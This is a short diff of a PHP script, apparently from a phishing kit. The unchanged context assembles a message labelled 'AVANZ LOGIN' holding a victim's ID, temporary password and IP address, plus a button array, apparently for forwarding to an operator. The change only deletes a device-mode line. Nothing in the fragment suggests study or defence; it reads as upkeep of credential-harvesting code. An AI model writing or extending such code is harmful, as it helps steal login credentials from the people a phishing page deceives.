@@ -133,7 +133,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $mensaje = "📥 AVANZ LOGIN\n";
     $mensaje .= "ID: $pp1\n";
     $mensaje .= "Clave temporal: $pp2\n";
-    $mensaje .= "Modo: $dispositivo\n";
     $mensaje .= "Red: $ip";
 
     $botones = [
